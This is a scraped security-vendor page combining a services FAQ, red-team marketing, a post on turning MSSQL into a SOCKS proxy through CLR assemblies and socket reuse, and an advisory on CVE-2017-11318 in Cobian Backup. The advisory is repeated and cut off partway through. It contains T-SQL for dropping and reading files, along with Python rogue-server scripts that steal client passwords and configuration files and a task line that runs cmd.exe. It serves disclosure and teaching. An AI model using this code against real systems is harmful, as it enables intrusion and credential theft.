## Frequently asked questions on cybersecurity services

### What services do cybersecurity companies provide?

Cybersecurity companies provide services to companies and public sector that help **identify weaknesses** which can cause damage (financial, reputational, competitive, etc.). Weaknesses can be of different types, as vulnerabilities affecting technologies, design flaws, poor security practices, or bad design. Thanks to the services provided by cybersecurity companies, it is possible to **identify attack vectors** that a cybercriminal could use, evaluate the impact an attack could have on users, customers or on the business, prevent security incidents, **respond** to security incident, drive the correction or mitigation of vulnerabilities, design a tailored cybersecurity plan or participate in the improvement of the organization’s security posture.

Within this initial classification, a large variety and highly specialized cybersecurity works are hidden, including pentesting on web, mobile, cloud technologies, application source code, or infrastructures such as Active directory, OT and IOT environments, and simulation exercises of cyberattacks.

### Who needs cybersecurity services?

All companies require cybersecurity services, although this need is increased when the security of information and systems has a considerable impact on the company’s business. For example, when the systems are used for the purpose of executing financial transactions, processing sensitive personal data (GDPR), or related to the physical security of people (such as in OT or critical environments), and in general, when a malicious actor may have a motivation to execute a cyberattack that causes damage to the company.

Cybersecurity services are essential when required by regulatory aspects, such as PCI DSS, DORA, TIBER; or when evidence of secure information management is required, as in ISO27001.

The higher the level of interconnection, exposure, and dependence on the company’s technology, the greater the investment in cybersecurity must be to prevent incidents. This is especially relevant when a supplier or technology is part of a supply chain and can impact the security of many companies. Historically, the banking and insurance sectors have invested the most in cybersecurity.

### What are the main problems with cybersecurity?

The main problem with cybersecurity is the use of ineffective **security controls** and safeguards (weak passwords, no second factor of authentication, technology architecture design flaws), application development-related (SDLC) security flaws, phishing, and use of outdated software that has vulnerabilities. Cybersecurity services help prevent and correct security problems at all layers, from development and source code, to applications, infrastructure, and communications.

Another issue with cybersecurity in several companies is the lack of procedures, or the lack of training to correctly respond to security incidents.

### Which tools are used in cyber security?

A large number of tools are used in cybersecurity both for the detection of vulnerabilities and for their exploitation. There are many commercial and open-source tools for any technology to support audit, so a pentester uses many of these tools throughout his workday.

The Kali Linux distribution is one of the best known and includes a wide suite of security analysis tools, among which we can find reconnaissance tools (OSINT) and port scanning (nmap, hping, ..), WiFi security tools, voip, web, vulnerability exploitation frameworks, forensic analysis, cracking or reverse engineering.

In addition to auditing tools, there are a significant number of technologies aimed at protection, monitoring and response to security incidents.

### Who benefits from cyber security?

The company using cybersecurity services is the main beneficiary of them, **reducing its attack surface**, and therefore the likelihood of incidents, and consequent financial loses, reputational damages or decrease in competitivity.

Customers as well are beneficiary of the cybersecurity services used by the company. They have guarantee that products or services they acquire from the company have reduced security risks, increasing the confidence on their provider.

Final users benefit of these services used by the provider. Their personal data are well protected, and the risk of disclosure to malicious actors reduced.

Recently, our [Red Teamers](https://www.tarlogic.com/red-team-services/) had to deal with a restricted scenario, where all traffic from the DMZ to the main network was blocked, except for connections to specific services like databases and some web applications. In this article, we will explain how we overcame the situation, covering the technical details. We also introduce [mssqlproxy](https://github.com/blackarrowsec/mssqlproxy), a tool for turning a Microsoft SQL Server into a socks proxy.

## Introduction and context

At some point, sysadmin access to a Microsoft SQL Server within the main network is gained, but only traffic to the 1433 port is allowed. After trying to launch a reverse shell via xp\_cmdshell, the team realizes that connections back to the DMZ were also blocked.

![Restricted environment](data:image/gif;base64...)

In order to turn the SQL Server into a useful pivot, we decided to apply some of the old socket reuse techniques [[1](https://www.blackhat.com/presentations/bh-asia-03/bh-asia-03-chong.pdf)] usually related to one-way shellcodes. The idea is to reuse the connection itself between the client and the database to pass data through, turning it into a working socks proxy.

![Tunnel created via SQL socket reuse](data:image/gif;base64...)![Tunnel created via SQL socket reuse](https://www.blackarrow.net/wp-content/uploads/2020/02/MSSQL02-1024x471.png)

Tunnel created via socket reuse

The first step is to execute code in the SQL Server process context. As extended stored procedures are going to be deprecated in future versions of MSSQL, we pay attention to Microsoft recommendations and thus, use CLR assemblies instead.

## CLR Assemblies

The usage of CLR assemblies in post-exploitation is another well-known technique. This article from NetSPI [[2](https://blog.netspi.com/attacking-sql-server-clr-assemblies/)] is a good starting point to understand how to implement your own assemblies.

In our case, we decided to develop an assembly which will be responsible of loading a DLL (written in C) and executing the whole networking logic. In the future, we may do all the work from the CLR itself.

To dynamically invoke a function of our DLL, we make use of LoadLibrary (to load the DLL) and GetProcAddress (to get a pointer to the function). However, we cannot call this function directly as we can do in C, because C# doesn’t support function pointers [[3](https://www.codeproject.com/Articles/27298/Dynamic-Invoke-C-DLL-function-in-C)]. Here we first have to convert the pointer to a Delegate object, using [Marshal.GetDelegateForFunctionPointer](https://docs.microsoft.com/es-es/dotnet/api/system.runtime.interopservices.marshal.getdelegateforfunctionpointer).

## Server: socket’s hunt and proxyfication

Let’s move on to the DLL part, where all the logic resides. To reuse the client’s socket, the first step is to find it. Different approaches can be used to perform this task, each with its own advantages and drawbacks. In this case, we choose the less intrusive way: **findport**. It consists of socket handler bruteforcing (since it’s identified by an integer), iterating until the target socket is found. The same technique has been used in the past by our Red Team in MySQL scenarios related with persistence [[4](https://x-c3ll.github.io/posts/Pivoting-MySQL-Proxy/)]. In this case, we can match the source address and port if the connection is made directly. If there are intermediaries (e.g. proxies, NAT/PAT) we can check the source address only if we are sure that there are no more connections from that host.

Since the whole process is triggered by a SQL query, we can obtain the source address of the request by querying `CONNECTIONPROPERTY('client_net_address')`. This way, if the connection is made via an intermediary, we can still get the right IP address without knowing it beforehand. If the connection is direct, we also provide the source port, obtained on the client side.

The findport bruteforce can be summarized as:

```
...
    // Iterate over all sockets
    for (i = 1; i < max_socket; i++) {
        len = sizeof(sockaddr);

        // Check if it is a socket
        if (getpeername((SOCKET)i, (SOCKADDR*)&sockaddr, &len) == 0) {
            // Check if it is our target
			if (strcmp(inet_ntoa(sockaddr.sin_addr), client_addr) == 0 && (client_port == 0 || sockaddr.sin_port == htons(client_port))) {
...
```

We noticed that one connection opened multiple socket handlers, and other threads were interfering. To make sure we fully control the socket, we can duplicate it (`WSADuplicateSocket`) and close the original one (`closesocket`). After that, a initialization message is sent to the client, to announce that the proxy socks is ready.

SOCKS5 is a simple protocol that can be implemented in a few lines of code. The server code was simplified and adapted from [this repo](https://github.com/fgssfgss/socks_proxy). We don’t want to reinvent the wheel, so the client stuff was developed on top of **impacket**, expanding the [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) capabilities.

## Client: mssqlclient.py 2.0

### File upload/download

First of all, we need to somehow **upload** files to the server, since we need to host the DLL. This can be done by using [Ole Automation Stored Procedures](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/ole-automation-stored-procedures-transact-sql) to instanciate an ADODB.Stream object [[5](https://docs.microsoft.com/en-us/sql/ado/reference/ado-api/stream-object-ado)].

```
DECLARE @ob INT;
EXEC sp_OACreate 'ADODB.Stream', @ob OUTPUT;
EXEC sp_OASetProperty @ob, 'Type', 1;
EXEC sp_OAMethod @ob, 'Open';
EXEC sp_OAMethod @ob, 'Write', NULL, 'C:\path\file.dll';
EXEC sp_OAMethod @ob, 'SaveToFile', NULL, 0x[HEXDATA], 2;
EXEC sp_OAMethod @ob, 'Close';
EXEC sp_OADestroy @ob;
```

Although not necessary for this scenario to work, we also added a **download** command. Files can be easily read from SQL using `OPENROWSET` with the BULK option [[6](https://docs.microsoft.com/es-es/sql/t-sql/functions/openrowset-transact-sql)].

```
SELECT * FROM OPENROWSET(BULK N'C:\path\file.ext', SINGLE_BLOB) rs
```
### Proxy mode

Relating to the proxy stuff, four commands have been implemented:

* **install**: Creates the CLR assembly and links it to a stored procedure. You need to provide the `-clr` param to read the generated CLR from a local DLL file.
* **uninstall**: Removes what **install** creates.
* **check**: Checks if everything is ready to start the proxy. Requires to provide the server DLL location (`-reciclador`), which can be uploaded using the **upload** command.
* **start**: Starts the proxy. If not `-local-port` is specified, it will start listening on port 1337.

Once the proxy is started, you can plug in your proxychains ;)

**Note:** if your connection is not direct (e.g. proxies in between), you have to use the `-no-check-src-port` flag, so the server will only check the source address.

## Conclusions

In this article we saw how to overcome a situation where the network restrictions only allow us to use a legitimate MSSQL service. This kind of isolation is extremely fragile and can be bypassed as long as the attacker can execute arbitrary code in the compromised service. The same approach can be translated to any other service that meets the conditions of loading custom code to hijack a client socket.

Red Team services

## Red Teaming Services

The mission of the **Red Team** in cybersecurity is to simulate a sponsored external agent performing unauthorized access to corporate systems. This involves not only classic intrusion but also long-term persistence, privilege escalation within corporate systems, and even the alteration and theft of strategic business information.

During their execution, **Red Team services** continuously assess the detection and response capabilities of the security team (**Blue Team**), simulating the actions of a hostile actor and testing defenses against a real attack.

Attack scenarios can be designed and guided by threat intelligence (TLPT), as defined by the **TIBER** and **DORA** framework, providing these exercises with increased realism.

## Benefits of Red Team services

**Red Team services** help detect and contain a **penetration event at an early stage** which results in preventing strategic information theft and corporate system down-time. This goal is gradually achieved thanks to:

### Detection of the company’s transversal weaknesses.

* Verifies the real impact of a cyberattack against your company by executing offensive cybersecurity exercises led by a threat intelligence team.

### Improvement and strengthening of response procedures

* Helps rapidly evolve the capabilities of the defensive team, allowing them to more effectively combat real situations they may potentially face in the future.

### Improvement of monitoring systems

* Reveals which suspicious activities have not been detected by monitoring systems, identifying and resolving weaknesses in the event detection and analysis process.

### Training of security personnel

* Trains security personnel to respond to real incidents by thoroughly analyzing the intrusion in joint working sessions between the offensive and defensive teams.

## Looking for Red Teaming services?

Contact our cybersecurity team if you have any questions or if you are in need of an assessment!

## How the Red Team Service is Carried Out

The BlackArrow team designs a complete attack scenario, defining the starting point and milestones to achieve during the intrusion execution, and carries it out without the knowledge of the company's cybersecurity team.

* **Asset Identification:** We discover and map assets, applications, and technologies used.
* **Simulation of Real Attacks:** We identify high-impact vulnerabilities and test them to see how the defenses would respond to different types of threats.
* **Continuous Improvement:** We not only detect failures but also offer specific solutions to strengthen security as we advance in intrusion and persistence within the network.
* **Regulatory Adaptation:** We help your company comply with industry-required regulations and security standards, enhancing its cyber resilience.

From Perimeter Breach to Ransomware Simulation

## Red Team Scenarios

**Red Team Scenarios** mimic threat actors like Remote Attackers, Malicious Employees or Ransomware Simulation among others.

Companies are continuously exposed to threat actors or adversaries that can introduce risks in several ways. According to that context, our Red Team simulates threat actors or adversaries looking for a particular objective. That is what it is called a Red Team Scenario.

The following table illustrates some alternatives that could be used to define the most suitable Red Team Scenario for a particular exercise:

Threat Actors

* Remote attacker
* Compromised Third Party or collaborator
* Compromised or disgruntled employee
* Competitors
* Activist / Terrorist
* Any other threat actors to be agree with our Clients

Intrusion vectors

* Vulnerability exploitation
* Social Engineering (including phishing)
* Password guessing
* WiFi or Ethernet
* Remote Access or VPN
* Leaked information (including user accounts)

Objectives

* Privilege escalation
* Targeted compromise (ERP, Treasury, OT, SCADA)
* Deploy Ransomware
* Leak sensitive information
* Leak/manipulate/sabotage products (software, patents)
* Force payments
* Any other objective to be agreed with our Clients

![red team scenarios](data:image/gif;base64...)

## Red team scenarios examples

In fact, like a real threat actor, **Red Teaming services** can simulate multiple scenarios to maximize success.

By choosing the most relevant Threat Actors and Objectives, it is possible to define particular **Red Teaming Scenarios** that can be found in a real environment. The following scenarios are only representative examples of what it can be found in a real environment:

* A **competitor** using a **leaked user account** to access **sensitive information** (**patents**)
* An **activist** trying to exploit a vulnerability to access **SCADA** infrastructure and perform **sabotage** activities
* A **disgruntled employee** collaborating to perform a malicious **payment to a third party account**
* A **partner** accessing corporate services, leads to a major compromise of **deploying ransomware**

## Ransomware simulation

This list is endless, and any realistic scenario could be reproduced as a Red Team Scenario

It is important to note that Red Teaming is much more than a Red Team scenario, but **Ransomware Simulation exercises**have gained some attention in the last few months. As ransomware attacks are becoming more frequent and sophisticated, organizations are increasing their effort to face any potential ransomware attack. Frequent questions clients ask us:

* Is my organization prepared to face a ransomware attack?
* Would my defensive layers identify, contain and recover from a targeted ransomware attack?
* Does my organization have experience to learn from other ransomware attacks and learn lessons from that experience?

![ransomware simulation test](data:image/gif;base64...)

![red team cyber security exercises](data:image/gif;base64...)

## Resilience in front of a ransomware attack

In the case that some of your answers were “no”, you may consider performing a Red Team Scenario focused on **Ransomware** Simulation exercises. In the particular case of Ransomware **Simulation exercises** we suggest two differentiated stages:

1. **Red Team Scenario**: Performing activities included in a Ransomware Simulation exercise by replicating a realistic targeted ransomware attack.
2. **Gap-Analysis**.: One **advisor** analyzes how our client defensive layers have detected, contained and recovered assets during the Red Team Scenario identifying improvement possibilities you can implement.

## Red team FAQs

### What is a Red Team exercise?

A Red Team exercise is the design and execution of an offensive operation aimed to **simulate a certain Malicious Actor.** This can verify the organization’s defensive layers and identify not only high/critical risk vulnerabilities but also **testing the real detection and response capabilities** provided by the organization.

### What is the difference between pentesting and red teaming?

While a [penetration test](https://www.tarlogic.com/penetration-testing-services/) usually is constrained to a particular scope and focuses mainly on vulnerabilities, **a red team service should not have a limited scope** but at the same time maintain focus on resilience rather than on vulnerabilities.

Under that context the outcome of a red team exercise should be a representation about how well an organization is prepared to face a certain Malicious Actor.

### How long does it take to conduct a red teaming service?

It depends on the designed exercise. Typically, an exercise without any previous information about an organization, could take a **minimum of 3 months** to obtain results. This however will represent the real situation of the defensive layers. Meanwhile other exercises starting with a certain level of access to internal resources could require less time.

Mature organizations tend to hire continuous red teaming operations, allowing them to perform **several exercises during the year**.

### Could a red team service cause any damage or disruption?

As any other offensive service, a red team exercise could lead to undesirable situations including damage or disruption. That is the reason why risk management is a key component of Red Teaming, including not only an **extremely experienced and accurated team** but also insurance policies to be covered for those unexpected situations.

### How does a red team versus blue team exercise help an organization?

During a Red Team exercise Blue Team technology, procedures and people can be trained to test if the defensive layers are working as expected.

Once a **Red Team** exercise has been completed, establishing working sessions with the Blue Team can help organizations to identify areas of improvement as well as sharing experiences to be prepared in the future.

CVE-2017-11318: RCE in Cobian Backup 11

# CVE-2017-11318: RCE in Cobian Backup 11

09 - Aug - 2017
- Juan Manuel Fernandez

During a [Tarlogic Red Team operation](https://www.tarlogic.com/red-team-services/), a serious vulnerability was discovered in Cobian Backup software (CVE-2017-11318) whose exploitation enabled taking the control over several machines in a corporate network.

## **Introduction to cobian vulnerability CVE-2017-11318**

Cobian Backup is software aimed at the creation of security copies containing a great variety of options and utilities. In corporate networks, it is developed with a customers’ architecture receiving backup tasks from a master server. Password allocation is necessary in order to connect a customer to the server.

[![Customer connected to master server](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-22.29.53-300x227.png) *Customer connected to master server*

Briefly analyzing the protocol and how the program logic works, several deficiencies could be observed. These ones can be abused by an attacker.

## **Customer’s connection to the servers**

First of all, we create a sniffer in order to analyze the existing traffic between the customer and the server (the service uses 16020 port by default).

[![Customer connection to cobian backup server](data:image/gif;base64...)

![Customer connection to cobian backup server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-23.44.29-300x231.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-23.44.29-300x231.png) *Customer connection to server*

At first sight, we can understand some protocol features:

* No encryption is used
* Everything is a readable text (A => 0041) and it is quite clear, what makes understanding easier
* Every information package exchanged uses the character “,” (002C) as data internal separator
* Every package is ended with the line break sequence (000A 000D)
* Customer is polling the server all the time (“REQUESTING” package, it would be a “ping”), and if it does not have any order waiting, the server might answer with a pong in the form of “IDLE”

Other feature that could be noticed quickly is the fact that the customer has never requested any sort of identification or credential to the server. That means, the customer is being connected blindly to the server, enabling an attacker to establish a man-in-the-middle system and seize the server. In order to prove this theory, we create a mini server en python imitating the observed behavior in Cobian Backup:

```
# Cobian Backup 11

import socket
import signal
import sys
from thread import *

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

###### Socket data
host = ''
port = 16020 #Default

###### Server Packets
idle = "490044004c0045002c002c000d000a00"
password_ok = "500041005300530057004f00520044005f004f004b002c002c000d000a00"

###### Main
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  sock.bind((host, port))
except socket.error as msg:
  print "Error: " + str(msg) + " - " + msg[1]
  sys.exit(1)
sock.listen(10)

while 1:
  conn, addr = sock.accept()
  print "[+] New client connected from " + addr[0]

  # 1) El cliente nos manda su password
  data = conn.recv(1024).split(",")
  print " -> Machine: " + data[2]
  print " -> Encrypted Password:n" + data[1]

  # 2) Le respondemos que la password es valida
  conn.send(password_ok.decode("hex"))

  # 3) Bucle de ping-pong para mantener conectado el cliente
  while 1:
    ping = conn.recv(1024)
    conn.send(idle.decode("hex"))
```

Then, it is observed how the plan has worked properly. The customer has sent the encrypted server password –although having a look diagonally and making a couple of greps to old versions source code, it seems that this is a reversible function- and additionally, the customer is kept connected until the connection is closed thanks to answering the pings.

![spoofed connection to cobian backup server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.13.32-300x26.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.13.32-300x26.png) *Customer connecting a spoofed server*
## **Interacting with customers**

Given the fact that it is proven that we can spoof the master server, the next concern that has to be solved is the following: Could we also execute actions in customers? Let’s take as an example the action of seeing configuration.

[![Server requesting the configuration file to a customer](data:image/gif;base64...)

![Server requesting the configuration file to a customer](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.25.41-300x174.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.25.41-300x174.png) *Server requesting the configuration file to a customer*

Following our theory, if we send a GET\_OPTIONS whenever a REQUESTING package is sent, the customer’s configuration file (cbEngine.ini) should be sent back.

```
# Cobian Backup 11

import socket
import signal
import sys
from thread import *

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

###### Socket data
host = ''
port = 16020 #Default

###### Server Packets
idle = "490044004c0045002c002c000d000a00"
password_ok = "500041005300530057004f00520044005f004f004b002c002c000d000a00"
get_options = "4700450054005f004f005000540049004f004e0053002c002c000d000a00"

###### Main
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  sock.bind((host, port))
except socket.error as msg:
  print "Error: " + str(msg) + " - " + msg[1]
  sys.exit(1)
sock.listen(10)

while 1:
  conn, addr = sock.accept()
  print "[+] New client connected from " + addr[0]

  # 1) The client sends its password
  data = conn.recv(1024).split(",")
  print " -> Machine: " + data[2]
  print " -> Encrypted Password:n" + data[1]

  # 2) Answering with valid password message
  conn.send(password_ok.decode("hex"))

  # 3) Client sends his  REQUESTING
  ping = conn.recv(1024)

  # 4) We send the GET_OPTIONS command
  conn.send(get_options.decode("hex"))

  # 5) The client should now send the cbEngine.ini content
  data = conn.recv(7000)
  print " -> Config:"

  # "," is used as a seperator
  config = data.split(",")
  for x in config[1:]:
    print x

  conn.close()
```

Whenever a customer is connected to us, the configuration is sent back:

[![Cobian Backup fake server](data:image/gif;base64...)

![Cobian Backup fake server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.36.36-300x289.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.36.36-300x289.png) *Our Cobian Backup false server receiving customer’s configuration.*

On the other hand, please observe below customer’s logs:

[![Customer log](data:image/gif;base64...)

![Customer log](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.37.02-300x38.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.37.02-300x38.png) *Customer log*

Even though, obtaining the configuration is interesting since important FTP, domain, mail, etc. accounts may appear in order to carry out a penetration test; we want something even more conclusive.

## **Commands remote execution in Cobian Backup**

From the master server control panel we can automatize the creation of “tasks” responsible for generating a backup according to the indicated configuration. Tasks are sent to the designated customer in the form of a template including different values –those values are the ones we have already allocated from the interface. Created tasks are stored in the DB folder. Please, find below an example of a task created from the server:

[![Sample of a programmed backup template](data:image/gif;base64...)

![Sample of a programmed backup template](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-3.46.26-300x166.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-3.46.26-300x166.png) *Sample of a programmed backup template*

The amount of parameters is huge, highlighting the possibility of quickly configuring as destination an external FTP. For example, we could use Cobian Backup to exfiltrate sensitive files through executing a task where one of our FTP is allocated as security copy destination. This is without doubt an attractive possibility. However, when analyzing the rest of configuring parameters we discover an even more interesting fact: pre and post backup events.

Reading Cobian Backup support forum, we could see that these parameters enable, among other things, the possibility of executing external programs before and after doing a backup. Therefore, they provide the possibility of executing commands remotely in every customer.

Once again, we follow the same working model. Therefore, we create the task manually in the server in order to intercept the traffic with a sniffer. Later, we will analyze the task and try to implement it in a script in python.

[![Creation of a backup task in a customer](data:image/gif;base64...)

![Creation of a backup task in a customer](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.19.48-300x87.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.19.48-300x87.png) *Creation of a backup task in a customer*

As it can be observed, an update\_list action is sent together with task parameters including name. In case we want to add a new task in order to execute our command through the events, we should copy the sample task and add the following:

```
EXECUTE,C:WindowsSystem32cmd.exe,
```

This parameter will open a window with cmd in the customer whenever this task is executed (this information could be read in Cobian Backup support forum). And, how do we indicate that we want the newly created task to be executed?

[![Servidor solicitando la ejecución de una tarea a un cliente](data:image/gif;base64...)

![Servidor solicitando la ejecución de una tarea a un cliente](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.26.03-300x46.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-20-a-las-0.26.03-300x46.png) *Server requesting task execution to a customer*

Using “BACKUP\_SELECTED”, we indicate the task name (which has been allocated in the previous phase when creating the task) we want to be executed. This small protocol abuse used by Cobian Backup is explained in a python script at the end of this page.

In case we test it:

[![task execution](data:image/gif;base64...)

## **Conclusion**

One of the most important Tarlogic Red Team features is our full-time commitment in order to search vulnerabilities in software used by our customers. This results in the discovery of 0-days in many occasions. Some of the results which may seem more interesting will be included in this blog (as this post, or such as we have already done with the [XSS Worm in an elder version of Tempobox OpenText](https://www.tarlogic.com/blog/opentext-tempobox-vulnerabilities/), and some others will be only reported (such as [vulnerabilities found in AeroAdmin](https://www.tarlogic.com/blog/aeroadmin-vulnerability-cve-2017-8893/) and used during a pentest).

It has to be always taken into account the possibility that an attacker may use non-published vulnerabilities to compromise a machine. It is in this point where the measures implemented during the [hardening](https://www.tarlogic.com/operating-system-hardening/) should [make lateral movement difficult in privilege escalation](https://www.tarlogic.com/blog/protection-privilege-escalation/).

Remote Command Execution

======================

Cobian Backup 11 client allows remote attackers to add and execute new backup tasks when master server is spoofed (man-in-the-middle). Attacker can execute system commands remotely abusing pre-backup events.

CVE-2017-11318: RCE in Cobian Backup 11

# CVE-2017-11318: RCE in Cobian Backup 11

09 - Aug - 2017
- Juan Manuel Fernandez

During a [Tarlogic Red Team operation](https://www.tarlogic.com/red-team-services/), a serious vulnerability was discovered in Cobian Backup software (CVE-2017-11318) whose exploitation enabled taking the control over several machines in a corporate network.

## **Introduction to cobian vulnerability CVE-2017-11318**

Cobian Backup is software aimed at the creation of security copies containing a great variety of options and utilities. In corporate networks, it is developed with a customers’ architecture receiving backup tasks from a master server. Password allocation is necessary in order to connect a customer to the server.

[![Customer connected to master server](data:image/gif;base64...)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-22.29.53-300x227.png) *Customer connected to master server*

Briefly analyzing the protocol and how the program logic works, several deficiencies could be observed. These ones can be abused by an attacker.

## **Customer’s connection to the servers**

First of all, we create a sniffer in order to analyze the existing traffic between the customer and the server (the service uses 16020 port by default).

[![Customer connection to cobian backup server](data:image/gif;base64...)

![Customer connection to cobian backup server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-23.44.29-300x231.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-14-a-las-23.44.29-300x231.png) *Customer connection to server*

At first sight, we can understand some protocol features:

* No encryption is used
* Everything is a readable text (A => 0041) and it is quite clear, what makes understanding easier
* Every information package exchanged uses the character “,” (002C) as data internal separator
* Every package is ended with the line break sequence (000A 000D)
* Customer is polling the server all the time (“REQUESTING” package, it would be a “ping”), and if it does not have any order waiting, the server might answer with a pong in the form of “IDLE”

Other feature that could be noticed quickly is the fact that the customer has never requested any sort of identification or credential to the server. That means, the customer is being connected blindly to the server, enabling an attacker to establish a man-in-the-middle system and seize the server. In order to prove this theory, we create a mini server en python imitating the observed behavior in Cobian Backup:

```
# Cobian Backup 11

import socket
import signal
import sys
from thread import *

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

###### Socket data
host = ''
port = 16020 #Default

###### Server Packets
idle = "490044004c0045002c002c000d000a00"
password_ok = "500041005300530057004f00520044005f004f004b002c002c000d000a00"

###### Main
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  sock.bind((host, port))
except socket.error as msg:
  print "Error: " + str(msg) + " - " + msg[1]
  sys.exit(1)
sock.listen(10)

while 1:
  conn, addr = sock.accept()
  print "[+] New client connected from " + addr[0]

  # 1) El cliente nos manda su password
  data = conn.recv(1024).split(",")
  print " -> Machine: " + data[2]
  print " -> Encrypted Password:n" + data[1]

  # 2) Le respondemos que la password es valida
  conn.send(password_ok.decode("hex"))

  # 3) Bucle de ping-pong para mantener conectado el cliente
  while 1:
    ping = conn.recv(1024)
    conn.send(idle.decode("hex"))
```

Then, it is observed how the plan has worked properly. The customer has sent the encrypted server password –although having a look diagonally and making a couple of greps to old versions source code, it seems that this is a reversible function- and additionally, the customer is kept connected until the connection is closed thanks to answering the pings.

![spoofed connection to cobian backup server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.13.32-300x26.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.13.32-300x26.png) *Customer connecting a spoofed server*
## **Interacting with customers**

Given the fact that it is proven that we can spoof the master server, the next concern that has to be solved is the following: Could we also execute actions in customers? Let’s take as an example the action of seeing configuration.

[![Server requesting the configuration file to a customer](data:image/gif;base64...)

![Server requesting the configuration file to a customer](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.25.41-300x174.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.25.41-300x174.png) *Server requesting the configuration file to a customer*

Following our theory, if we send a GET\_OPTIONS whenever a REQUESTING package is sent, the customer’s configuration file (cbEngine.ini) should be sent back.

```
# Cobian Backup 11

import socket
import signal
import sys
from thread import *

def signal_handler(signal, frame):
        print('You pressed Ctrl+C!')
        sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

###### Socket data
host = ''
port = 16020 #Default

###### Server Packets
idle = "490044004c0045002c002c000d000a00"
password_ok = "500041005300530057004f00520044005f004f004b002c002c000d000a00"
get_options = "4700450054005f004f005000540049004f004e0053002c002c000d000a00"

###### Main
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
  sock.bind((host, port))
except socket.error as msg:
  print "Error: " + str(msg) + " - " + msg[1]
  sys.exit(1)
sock.listen(10)

while 1:
  conn, addr = sock.accept()
  print "[+] New client connected from " + addr[0]

  # 1) The client sends its password
  data = conn.recv(1024).split(",")
  print " -> Machine: " + data[2]
  print " -> Encrypted Password:n" + data[1]

  # 2) Answering with valid password message
  conn.send(password_ok.decode("hex"))

  # 3) Client sends his  REQUESTING
  ping = conn.recv(1024)

  # 4) We send the GET_OPTIONS command
  conn.send(get_options.decode("hex"))

  # 5) The client should now send the cbEngine.ini content
  data = conn.recv(7000)
  print " -> Config:"

  # "," is used as a seperator
  config = data.split(",")
  for x in config[1:]:
    print x

  conn.close()
```

Whenever a customer is connected to us, the configuration is sent back:

[![Cobian Backup fake server](data:image/gif;base64...)

![Cobian Backup fake server](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.36.36-300x289.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.36.36-300x289.png) *Our Cobian Backup false server receiving customer’s configuration.*

On the other hand, please observe below customer’s logs:

[![Customer log](data:image/gif;base64...)

![Customer log](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.37.02-300x38.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-0.37.02-300x38.png) *Customer log*

Even though, obtaining the configuration is interesting since important FTP, domain, mail, etc. accounts may appear in order to carry out a penetration test; we want something even more conclusive.

## **Commands remote execution in Cobian Backup**

From the master server control panel we can automatize the creation of “tasks” responsible for generating a backup according to the indicated configuration. Tasks are sent to the designated customer in the form of a template including different values –those values are the ones we have already allocated from the interface. Created tasks are stored in the DB folder. Please, find below an example of a task created from the server:

[![Sample of a programmed backup template](data:image/gif;base64...)

![Sample of a programmed backup template](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-3.46.26-300x166.png)](https://www.tarlogic.com/wp-content/uploads/2017/07/Captura-de-pantalla-2017-07-15-a-las-3.46.26-300x166.png) *Sample of a programmed backup template*

